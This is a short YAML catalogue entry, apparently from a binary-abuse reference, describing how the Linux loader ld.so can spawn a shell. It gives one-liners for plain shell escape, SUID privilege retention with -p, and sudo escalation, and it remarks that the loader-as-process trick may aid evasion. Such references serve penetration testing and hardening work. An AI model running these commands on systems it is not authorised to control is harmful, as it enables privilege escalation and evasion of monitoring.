---
description: |
  `ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:

  ```
  $ strings /proc/self/exe | head -1
  /lib64/ld-linux-x86-64.so.2
  ```

  It's worth noting that the spawned process will be the loader, not the target executable, this might aid evasion. See https://shyft.us/posts/20230526_linux_command_proxy.html for more information.
functions:
  shell:
    - code: /lib/ld.so /bin/sh
  suid:
    - code: ./ld.so /bin/sh -p
  sudo:
    - code: sudo /lib/ld.so /bin/sh
---
